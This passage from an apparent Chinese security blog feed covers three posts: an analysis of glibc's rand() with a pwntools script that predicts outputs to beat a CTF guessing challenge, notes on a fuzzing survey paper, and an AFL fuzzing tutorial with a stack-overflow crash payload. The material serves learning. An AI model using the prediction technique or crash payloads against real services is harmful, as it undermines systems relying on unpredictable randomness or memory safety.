*end_ptr = buf-&gt;end_ptr;</span><br><span class="line">        uint32_t val;</span><br><span class="line"></span><br><span class="line">        val = *fptr += (uint32_t)*rptr;</span><br><span class="line">        /* Chucking least random bit. */</span><br><span class="line">        *result = val &gt;&gt; 1;</span><br><span class="line">        ++fptr;</span><br><span class="line">        if (fptr &gt;= end_ptr)</span><br><span class="line">        &#123;</span><br><span class="line">            fptr = state;</span><br><span class="line">            ++rptr;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            ++rptr;</span><br><span class="line">            if (rptr &gt;= end_ptr)</span><br><span class="line">                rptr = state;</span><br><span class="line">        &#125;</span><br><span class="line">        buf-&gt;fptr = fptr;</span><br><span class="line">        buf-&gt;rptr = rptr;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line"></span><br><span class="line">fail:</span><br><span class="line">    __set_errno(EINVAL);</span><br><span class="line">    return -1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考注释可以得知 生成器有两种类型 TYPE_0是使用旧的线性同余法  另外一个则是使用精巧三项式算法<br>先来看较为简单的前者 state[0]指向randtbl数组的第二个元素 将其乘以1103515245 U代表无符号整数 随后加上12345 最后进行与运算<br>这里清空了符号位 并且只保留低31位<br>随后更新state[0]以及result</p><p>接下来看后者<br>开始先将结构体的成员赋值给对应的局部变量(下面 前指针和后指针所指向的数值 为了方便描述 均采用缩写为前后指针<br>接着将后指针加上前指针 其和重新赋值给了前指针以及val变量<br>随后的注释比较耐人寻味 其说舍弃最不随机的位<br>下一条指令对val右移了一位 相当于val除2 结果取整<br>这里说的最不随机的位指的是最低1位<br>就拿线性同余运算举例<br>其运算式为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">val = ((state[0] * 1103515245U) + 12345U) &amp; 0x7fffffff</span><br></pre></td></tr></table></figure><p>这里使用state[0]默认的值379960547代入<br>可以编写这样一个测试程序</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;signal.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">    int32_t state = 379960547;</span><br><span class="line">    int32_t val =0;</span><br><span class="line">    int time=1;</span><br><span class="line">    int bit =0;</span><br><span class="line">    for(int i=0;i&lt;20;i++)&#123;</span><br><span class="line">        val = ((state * 1103515245U) + 12345U) &amp; 0x7fffffff;</span><br><span class="line">        bit = val&amp;1;</span><br><span class="line">        state = val;</span><br><span class="line">        printf(&quot;count :%d ,val :%d,last bit: %d\n&quot;,time,val,bit);</span><br><span class="line">        time ++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后得到的结果为<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310312226443.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310312226443.png" alt="image.png"></a><br>可以看到最后一个bit为0和1交替 呈现出一定规律 所以称之为最不随机的位<br>说回正文 在进行了右移运算后 自增了前指针<br>如果前指针超过了数组的最后一个元素 那么就重置前指针 使其重新指向randtbl数组的第二个元素<br>如果没有超过 再自增后指针 如果后指针超过 那么就重置后指针 同上</p><h1 id="如何预测随机数"><a href="#如何预测随机数" class="headerlink" title="如何预测随机数"></a>如何预测随机数</h1><p>经过上面的源码分析<br>可以大概清楚随机数的生成逻辑<br>state数组从randtbl数组的第二个元素开始 也就是说state一共有31个元素<br>前指针初始指向s[3] (这里将state数组缩写成s)<br>后指针初始指向s[0]<br>那么我们这里就可以得到随机数数组o的第一个元素为<br>o[0] &#x3D; (s[3]+s[0])&gt;&gt;1<br>随后前指针和后指针均自增<br>随着推移 前指针会率先来到s数组的最后一个元素s[30]<br>根据源码推断 超过了s[30]后 就会重新赋值成s[0]<br>但是这里要注意 在随机数生成后 后指针与前指针之和会赋值给前指针<br>所以我们这里的s[?]只是一个代号 而非具体的值<br>也就是o[28] &#x3D; (s[0]+s[28])&gt;&gt;1<br>同理 o[31] &#x3D; (s[3]+s[0])&gt;&gt;1<br>如果拆分开成 s[3]&#x3D;s[3]+s[0],s[0] &#x3D; s[0]+s[28]<br>o[31]的值就有两种可能性<br>第一种为o[31] &#x3D; o[0]+o[28]<br>第二种为o[31] &#x3D; o[0]+o[28]+1<br>见下面表格</p><table><thead><tr><th>s[0]</th><th>s[3]</th><th>s[28]</th><th>o[31]</th></tr></thead><tbody><tr><td>奇</td><td>奇</td><td>奇</td><td>1</td></tr><tr><td>奇</td><td>奇</td><td>偶</td><td>1</td></tr><tr><td>奇</td><td>偶</td><td>奇</td><td>1</td></tr><tr><td>偶</td><td>奇</td><td>奇</td><td>2</td></tr><tr><td>奇</td><td>偶</td><td>偶</td><td>2</td></tr><tr><td>偶</td><td>偶</td><td>奇</td><td>1</td></tr><tr><td>偶</td><td>偶</td><td>偶</td><td>1</td></tr></tbody></table><p>可以看出是第一种可能性的概率为七分之五<br>也就是说 如果我们得到了o[0]和o[28] 我们就有比较大的概率预测出o[31]<br>同理 可以继续往下推  o[1]和o[29] 可得出o[32]等等<br>o[n] &#x3D; o[n-31]+o[n-3]或o[n] &#x3D; o[n-31]+o[n-3]+1<br>由于本人数学水平不高 所以无法想出怎么百分百预测 感兴趣的可以自己尝试(顺顺教教我</p><h1 id="实际演示"><a href="#实际演示" class="headerlink" title="实际演示"></a>实际演示</h1><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311041006599.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311041006599.png" alt="image.png"></a><br>以上面这题来举例 seed无法得知也无法覆盖<br>一共有101次机会<br>在猜数错误后 会提供正确的随机数<br>所以我们只需要保留o[0]和o[28]<br>就可以得出第32个随机数o[31]</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">o = []</span><br><span class="line">buf = 0</span><br><span class="line">for i in range(31):</span><br><span class="line">    io.recvuntil(&quot;Knowledge is power, not luck.\n&quot;)</span><br><span class="line">    io.sendline(b&#x27;0&#x27;)</span><br><span class="line">    io.recvuntil(&#x27;Here is some knowledge to help you become powerful...: &#x27;)</span><br><span class="line">    c = int(io.recvuntil(&quot;\n&quot;,drop = True))</span><br><span class="line">    o.append(c)</span><br><span class="line">buf = o[0]+o[28]</span><br><span class="line">print(buf)</span><br><span class="line">io.recvuntil(&quot;Knowledge is power, not luck.\n&quot;)</span><br><span class="line">io.sendline(str(buf))</span><br><span class="line">io.recv()</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311041009081.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311041009081.png" alt="image.png"></a><br>成功得到正确的数值</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="extra" scheme="http://example.com/categories/extra/"/>
    
    
  </entry>
  
  <entry>
    <title>Fuzzing: Art, Science, and Engineering论文阅读</title>
    <link href="http://example.com/2023/10/17/fuzzing-art-science-and-engineering%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/"/>
    <id>http://example.com/2023/10/17/fuzzing-art-science-and-engineering%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/</id>
    <published>2023-10-17T09:13:39.000Z</published>
    <updated>2023-10-22T14:07:14.049Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>原论文地址:<a href="https://arxiv.org/pdf/1812.00140.pdf">https://arxiv.org/pdf/1812.00140.pdf</a><br>由于本人的英文水平实在是太垃圾了 所以用的是谷歌机翻看的<br>部分语句可能由于机翻带来的影响导致语义错误</p><h1 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h1><p>模糊测试是一种概念简单 部署门槛低 且成效显著的漏洞发现技术<br>本文的目的旨在帮助保存大量的模糊测试样例以及保证其连贯性 提出一个统一的通用模型</p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>作者简单介绍了fuzz是什么 以及此前其存在的缺陷 同时举了几个比赛队伍或者厂商使用FUZZ的案例  随后简要概括了fuzz社区的规模<br>因为fuzz的逐渐发展 导致了各种fuzz工具之间的术语存在明显的“歧义”(fragmentation)<br>作者认为 这种歧义很有可能会阻碍fuzz的传播  影响到fuzz的发展<br>所以 其认为有必要巩固和提炼模糊测试的进展 </p><h1 id="SYSTEMIZATION-TAXONOMY-AND-TEST-PRO-GRAMS"><a href="#SYSTEMIZATION-TAXONOMY-AND-TEST-PRO-GRAMS" class="headerlink" title="SYSTEMIZATION, TAXONOMY, AND TEST PRO-GRAMS"></a>SYSTEMIZATION, TAXONOMY, AND TEST PRO-GRAMS</h1><p>介绍了模糊测试最开始的提出者以及其最开始的定义 列举了模糊测试可适用的领域 接着为了使得大量模糊测试文献中的用语系统化 作者决定介绍一个由现代用途中提取的术语</p><h2 id="1-Fuzzing-Fuzz-Testing"><a href="#1-Fuzzing-Fuzz-Testing" class="headerlink" title="1.Fuzzing &amp; Fuzz Testing"></a>1.Fuzzing &amp; Fuzz Testing</h2><p>本小节针对模糊测试下了第一个定义</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Definition 1 (Fuzzing). Fuzzing is the execution of the PUTusing input(s) sampled from an input space (the “fuzz inputspace”) that protrudes the expected input space of the PUT.</span><br><span class="line">这里的put是program under test</span><br></pre></td></tr></table></figure><p>此外还针对fuzz testing和fuzz进行了一个定义<br>作者认为fuzz testing是一种利用fuzz的软件测试技术 其的特定目标是用来查找和安全有关的错误 包括程序崩溃</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Definition 2 (Fuzz Testing). Fuzz testing is the use of fuzzing</span><br><span class="line">to test if a PUT violates a security policy.</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Definition 3 (Fuzzer). A fuzzer is a program that performs</span><br><span class="line">fuzz testing on a PUT.</span><br></pre></td></tr></table></figure><p>此外还定义了fuzz compaign</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Definition 4 (Fuzz Campaign). A fuzz campaign is a specific</span><br><span class="line">execution of a fuzzer on a PUT with a specific security</span><br><span class="line">policy.</span><br></pre></td></tr></table></figure><p>早期的模糊测试活动 其安全策略只局限于测试输入 使PUT崩溃 但是模糊测试活动可以用于测试执行中观察到的任何安全策略 而这一决定执行是否违反安全策略的称为漏洞预测器</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Definition 5 (Bug Oracle). A bug oracle is a program, per-</span><br><span class="line">haps as part of a fuzzer, that determines whether a given</span><br><span class="line">execution of the PUT violates a specific security policy.</span><br></pre></td></tr></table></figure><p>这一段话有点没看懂 目前还不能理解执行中观察到的任何安全策略的含义 除了输入点可以诱发的崩溃 还有什么呢 笔者于这里提出了第一个疑问<br>作者称由模糊器实现的算法为模糊算法 模糊参数是依赖于PUT之外的一些参数 称其为模糊配置 笔者这里将其理解为 模糊参数于PUT不相干 是否可以认为是一种用于模糊测试的语料库</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Definition 6 (Fuzz Configuration). A fuzz configuration of</span><br><span class="line">a fuzz algorithm comprises the parameter value(s) that</span><br><span class="line">control(s) the fuzz algorithm.</span><br></pre></td></tr></table></figure><p>接着针对模糊算法进行了进一步的说明 作者认为模糊算法的定义是广泛的 复杂的模糊配置会随着时间的推移而演变其算法 引入了突变率和种子的概念<br>种子是用来生成输入PUT的测试用例<br>而种子的集合则成为种子池 复杂的模糊配置就会演变种子池<br>作者举了一个基于覆盖率引导的模糊测试例子 其会在每个配置中存储已经达到的覆盖率信息<br>笔者这里经过查阅资料(其实是询问gpt 大致了解了覆盖率是一种什么概念<br>覆盖率引导是一种模糊测试的技术策略 其主要目的是用来寻找最优的测试用例 该测试用例可以经过最多的代码分支 经过的代码占总代码的百分比就是覆盖率<br>那么这里就是一种迭代的过程 会根据上一次的模糊测试返回的覆盖率 来决定下一次的种子 从而使其获得更大的覆盖率</p><h2 id="2-Paper-Selection-Criteria"><a href="#2-Paper-Selection-Criteria" class="headerlink" title="2.Paper Selection Criteria"></a>2.Paper Selection Criteria</h2><p>这一小节 主要是作者声明了收纳出版物的范围 举了几个会议的名称<br>同时引入了黑盒白盒的概念(并未由作者提出 为笔者根据段落大意可以看出)<br>作者认为 以安全为特定目标的模糊测试和软件测试相比 从理论来说 二者的不同点只体现在漏洞预测器的区别(bug oracle)<br>接着作者提到 在实际中 软件测试的前提是知晓源代码 而且测试人对于PUT有更多的了解<br>而模糊测试更可能是被PUT开发者以外的人使用 其不知晓上述信息<br>由于这二者领域仍然密切相关 所以作者决定 只要出版物出现模糊(fuzz)一次 就纳入其中</p><h2 id="3-Fuzz-Testing-Algorithm"><a href="#3-Fuzz-Testing-Algorithm" class="headerlink" title="3.Fuzz Testing Algorithm"></a>3.Fuzz Testing Algorithm</h2><p>本节作者提供了一个算法1<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310192020010.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310192020010.png" alt="image.png"></a><br>其采用一组模糊配置C以及Tlimit(最大时间限制)作为输入<br>输出一组已发现的错误<br>其由两部分组成 第一部分为预处理(preprocess)函数构成 该函数在模糊测试开始时执行<br>第二部分为由五个功能组成的循环 但不是所有的模糊器都全是这五个功能<br>称这个循环的每次运行为模糊迭代 每次inputeval将模糊样例输入给PUT称为模糊运行</p><h3 id="PREPROCESS-C-C"><a href="#PREPROCESS-C-C" class="headerlink" title="PREPROCESS(C)-&gt;C"></a>PREPROCESS(C)-&gt;C</h3><p>用户向P提供一组模糊配置 其可能返回一组已修改的模糊配置<br>根据模糊算法的不同 P可以执行各种各样的操作 比如插入测试代码到PUT中<br>或者测量种子文件的执行速度</p><h3 id="SCHEDULE-C-Telapsed-Tlimit-conf"><a href="#SCHEDULE-C-Telapsed-Tlimit-conf" class="headerlink" title="SCHEDULE(C,Telapsed,Tlimit)-&gt;conf"></a>SCHEDULE(C,Telapsed,Tlimit)-&gt;conf</h3><p>将一组模糊配置C 最大时间限制 经过的时间作为参数输入 其会返回一个用于当前模糊迭代的模糊配置<br>这句话笔者有点没看懂 是意味着该功能负责实现模糊配置的迭代?<br>不过作者说详细看2.4节 所以这里暂且留一个疑问</p><h3 id="INPUTGEN-conf-tcs"><a href="#INPUTGEN-conf-tcs" class="headerlink" title="INPUTGEN(conf)-&gt;tcs"></a>INPUTGEN(conf)-&gt;tcs</h3><p>这个功能输入一个当前模糊配置 根据模糊器的不同 会选择模糊配置中的种子 又或者是模型或语法作为参数 以此来输出模糊测试的样例<br>笔者这里对于模型和语法是什么东西 还没有概念 先继续往下看</p><h3 id="INPUTEVAL-conf-tcs-0bug-B-execinfos"><a href="#INPUTEVAL-conf-tcs-0bug-B-execinfos" class="headerlink" title="INPUTEVAL(conf,tcs,0bug)-&gt;B,execinfos"></a>INPUTEVAL(conf,tcs,0bug)-&gt;B,execinfos</h3><p>接收当前模糊配置conf 模糊测试样例 以及漏洞预测器作为参数<br>该功能用于判断PUT是否违反了安全策略<br>结束后会输出一个漏洞合集B 以及execinfos 用来迭代模糊配置</p><h3 id="CONFUPDATE-C-conf-execinfos-C"><a href="#CONFUPDATE-C-conf-execinfos-C" class="headerlink" title="CONFUPDATE(C,conf,execinfos)-&gt;C"></a>CONFUPDATE(C,conf,execinfos)-&gt;C</h3><p>接收模糊配置C 当前模糊配置conf execinfos作为参数<br>该功能用来更新模糊配置C</p><h3 id="CONTINUE-C-True-False"><a href="#CONTINUE-C-True-False" class="headerlink" title="CONTINUE(C)-&gt;{True,False}"></a>CONTINUE(C)-&gt;{True,False}</h3><p>该功能用来接收当前模糊配置 并且进行判断是否进行模糊迭代<br>如果没有新的路径可发现 其就可以终止执行</p><h2 id="4-Taxonomy-of-Fuzzers"><a href="#4-Taxonomy-of-Fuzzers" class="headerlink" title="4.Taxonomy of Fuzzers"></a>4.Taxonomy of Fuzzers</h2><p>本节 作者对于模糊器的分类进行了定义 分为了三种 黑盒 白盒 灰盒<br>同时 这与传统的软件测试分类不同 灰盒是作为白盒的变体</p><h3 id="Black-box-Fuzzer"><a href="#Black-box-Fuzzer" class="headerlink" title="Black-box Fuzzer"></a>Black-box Fuzzer</h3><p>黑盒适用于模糊测试以及软件测试中 表示测试者无法看到PUT的内部结构 只能看到PUT的输入输出 大部分的模糊器都属于这一类<br>现代的部分模糊器 在考虑输入的结构信息以此来生成更有意义的测试样例的同时 也会保证不检查PUT</p><h3 id="White-box-Fuzzer"><a href="#White-box-Fuzzer" class="headerlink" title="White-box Fuzzer"></a>White-box Fuzzer</h3><p>白盒测试是指在进行模糊测试的时候 已经了解了PUT的内部结构和逻辑<br>接着作者提到 白盒测试一词最早的提及是动态符号执行DSE<br>普通的符号执行是指利用符号值而非输入值来分析执行路径<br>而动态符号执行中 符号执行和具体执行路径同时运行 根据PUT的状态和具体输入的数据来简化符号约束条件<br>在简化符号约束条件中 可以将符号值转化为具体的值 例如将符号执行的系统调用转化为实际的系统调用<br>上述的符号值表示的概念 按笔者的理解 应该是用例如符号’a’这样的字符来代替具体的值例如’6’ 类似于数学中一元方程的x<br>随后 作者还提到 白盒测试通常来用来描述污点分析的模糊器<br>笔者查询得知 污点分析中的污点是指不受信任的输入源进入PUT的数据 通常是用户输入<br>通过模糊器生成污点数据 可以模拟潜在的攻击场景 检测PUT是否在处理污点数据的时候存在安全隐患<br>作者提到 由于白盒测试需要进行动态检测和smt求解 所以相比黑盒测试 所需要的开销会更多</p><h3 id="Grey-box-Fuzzer"><a href="#Grey-box-Fuzzer" class="headerlink" title="Grey-box Fuzzer"></a>Grey-box Fuzzer</h3><p>灰盒测试位于白盒和黑盒之间  模糊器可以获得PUT的一部分内部信息<br>与白盒模糊器相比 灰盒不会推理PUT的完整语义<br>笔者认为 这里的完整语义是指 PUT的内部逻辑 数据流 控制流以及外部的交互等等<br>作者提到 灰盒测试可以对PUT进行轻量的静态分析或者收集其执行的动态信息 比如代码覆盖率</p><h2 id="5-Fuzzer-Genealogy-and-Overview"><a href="#5-Fuzzer-Genealogy-and-Overview" class="headerlink" title="5.Fuzzer Genealogy and Overview"></a>5.Fuzzer Genealogy and Overview</h2><p>暂时看不下去了 断更。。。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="extra" scheme="http://example.com/categories/extra/"/>
    
    
  </entry>
  
  <entry>
    <title>FUZZ学习</title>
    <link href="http://example.com/2023/10/17/fuzz%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2023/10/17/fuzz%E5%AD%A6%E4%B9%A0/</id>
    <published>2023-10-17T08:37:27.000Z</published>
    <updated>2023-11-20T02:59:52.151Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>对于FUZZ的大名早有耳闻 今天终于开始正式学习这一知识<br>水平有限 本篇文章可能部分地方存在描述错误等问题<br>本篇文章使用AFL模糊器</p><h1 id="什么是FUZZ"><a href="#什么是FUZZ" class="headerlink" title="什么是FUZZ"></a>什么是FUZZ</h1><p>为了弄清楚FUZZ的概念 拜读了《Fuzzing: Art, Science, and Engineering》这篇经典的论文 如果有想看我阅读后总结的 可以去看另外一篇博客 这里就简单概述<br>FUZZ相比传统的软件测试 其包含的漏洞预测器用于决定测试过程中是否违反了安全策略<br>二者的目的性不一样 而FUZZ又分为三种 白盒 黑盒 灰盒 三者最大的差别在于模糊器对于PUT(待测程序)的了解程度有多少 是否知晓PUT的内部逻辑等<br>FUZZ采用模糊算法来生成随机的测试样例 部分复杂的模糊配置可以演变种子池来迭代测试样例 通常依靠代码覆盖率(即PUT执行路径)</p><h1 id="配置FUZZ环境"><a href="#配置FUZZ环境" class="headerlink" title="配置FUZZ环境"></a>配置FUZZ环境</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://lcamtuf.coredump.cx/afl/releases/afl-latest.tgz</span><br><span class="line">tar xvf afl-latest.tgz</span><br><span class="line">cd afl-2.52b</span><br><span class="line">sudo make &amp;&amp; sudo make install</span><br></pre></td></tr></table></figure><p>上述是afl的安装 我个人建议是使用afl++ 不过本篇文章均采用afl<br>同时上述方式安装的afl版本是2.52 实际上最新的版本为2.57 需要去github上下载源代码后make编译 这里看各位的需求</p><h1 id="第一次FUZZ"><a href="#第一次FUZZ" class="headerlink" title="第一次FUZZ"></a>第一次FUZZ</h1><p>我们先来自己编写一个程序 逻辑很简单 输入对应的字符串就触发段错误</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;signal.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main(int argc, char *argv[]) &#123;</span><br><span class="line">    char buf[100];</span><br><span class="line">    scanf(&quot;%s&quot;,buf);</span><br><span class="line">    char buf1[] = &quot;aaaa&quot;;</span><br><span class="line">    if(!strcmp(buf,buf1))&#123;</span><br><span class="line">        printf(&quot;success!\n&quot;);</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        printf(&quot;faile\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>随便创建两个空目录 一个用来存放测试样例  一个用来存放输出信息<br>本次模糊测试 测试样例由我们自己填写<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242045496.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242045496.png" alt="image.png"></a><br>随后使用-i指定前者 -o指定后者 开始fuzz</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">afl-fuzz -i ./fuzz/in -o ./fuzz/out ./test</span><br></pre></td></tr></table></figure><p>当然了 如果你使用的是afl 那么你就会发现 模糊器读取到第二个样例的时候就终止了<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242047047.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242047047.png" alt="image.png"></a><br>原因在于afl的测试样例貌似不能直接导致PUT触发crash<br>所以这里更改第二个样例 使其为aaa 让模糊器使其迭代 延伸成aaaa这个字符串<br>随后重新开始fuzz 发现成功找到了三个crash<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242131457.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242131457.png" alt="image.png"></a></p><p>看到官方文档说 如果要让模糊器运行完毕 需要几个小时到一周左右 所以这里直接ctrl+c终止了<br>官方文档提到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crashes/ - unique test cases that cause the tested program to receive a fatal signal (e.g., SIGSEGV, SIGILL, SIGABRT). The entries are grouped by the received signal.</span><br></pre></td></tr></table></figure><p>所以去crashes目录下找到了三个触发崩溃的样例<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242131539.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242131539.png" alt="image.png"></a><br>第一个不出所料 是我们原定的字符串aaaa 第二个和第三个有点意外 貌似也是一些无规则字节 打算动调来看看 利用hexdump获取一下16进制格式的ascii字节码<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242151963.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242151963.png" alt="image.png"></a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\x68\x68\x68\x68\x32\x00\x00\x68\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xCE\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\x68\x87\x68\xE8\x00\x10\x68\x7F\xFF\xF0\xF0\xF0\xF0\xF0\xCF\xF0\xF0\xF0\xE4\xF0\xF0\xF0\x70\xF0\x68\x68\x68\x68\x32\x68\x68\x68\x68\x68\x68\xE8\x68\x68\x68\x68\xF0\xF0\xF0\xF0\xF0\xF0\xCF\xF0\xF0\xF0\xF0\x68\x68\xF0\xE9\xF0\xF0\xFB\xF0\xCF\xF0\xF0\xF0\xF0\xF0\xF0\x07\x70\xF0\x68\x68\x68\x68\x68\x68\x68\x6E\x00\x00\x01\x00\x70\xF0\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\xDF\xD1</span><br></pre></td></tr></table></figure><p>调试exp:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">io = process(&quot;./test&quot;)</span><br><span class="line">elf = ELF(&quot;./test&quot;)</span><br><span class="line">context.arch = &quot;amd64&quot;</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = &quot;\x68\x68\x68\x68\x32\x00\x00\x68\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xCE\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\x68\x87\x68\xE8\x00\x10\x68\x7F\xFF\xF0\xF0\xF0\xF0\xF0\xCF\xF0\xF0\xF0\xE4\xF0\xF0\xF0\x70\xF0\x68\x68\x68\x68\x32\x68\x68\x68\x68\x68\x68\xE8\x68\x68\x68\x68\xF0\xF0\xF0\xF0\xF0\xF0\xCF\xF0\xF0\xF0\xF0\x68\x68\xF0\xE9\xF0\xF0\xFB\xF0\xCF\xF0\xF0\xF0\xF0\xF0\xF0\x07\x70\xF0\x68\x68\x68\x68\x68\x68\x68\x6E\x00\x00\x01\x00\x70\xF0\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\xDF\xD1&quot;</span><br><span class="line">gdb.attach(io,&#x27;b *$rebase(0x1244)&#x27;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure><p>在程序执行到pthread_kill函数后 回溯一下执行流 发现了检查canary的函数<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242207740.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242207740.png" alt="image.png"></a><br>应该是由于栈溢出触发的crash<br>那么接下来来看第三个<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242208078.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242208078.png" alt="image.png"></a><br>看这个长度应该也是因为栈溢出导致的crash 那么这里就不进一步动调了</p><h1 id="黑盒测试以及读取文件内容"><a href="#黑盒测试以及读取文件内容" class="headerlink" title="黑盒测试以及读取文件内容"></a>黑盒测试以及读取文件内容</h1><p>本小节用来记录自己对于afl官方文档阅读后的理解和实操  没啥重要性<br>文档中粗略介绍了afl所采用的模糊算法<br>总结一下 可以得到下图<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310251248485.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310251248485.png" alt="image.png"></a><br>大体是和论文中描述的模糊器的五个功能大差不差<br>随后想要研究一下afl的黑盒测试功能  然后在配置环境的时候 不得不说是真的遇到一堆报错<br>首先进入下载的afl源码目录中的qemu-mode目录 运行build_qemu_support.sh</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd qemu-mode</span><br><span class="line">./build_qemu_support.sh</span><br></pre></td></tr></table></figure><p>这里我首先遇到的是下载qemu的网址报错404 但是也不是虚拟机代理问题 我宿主机也访问不到<br>进入build文件中 找到对应代码的位置<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310251445451.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310251445451.png" alt="image.png"></a><br>将QEMU_URL更改为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://download.qemu.org/qemu-$&#123;VERSION&#125;.tar.xz</span><br></pre></td></tr></table></figure><p>随后就可以正常下载了 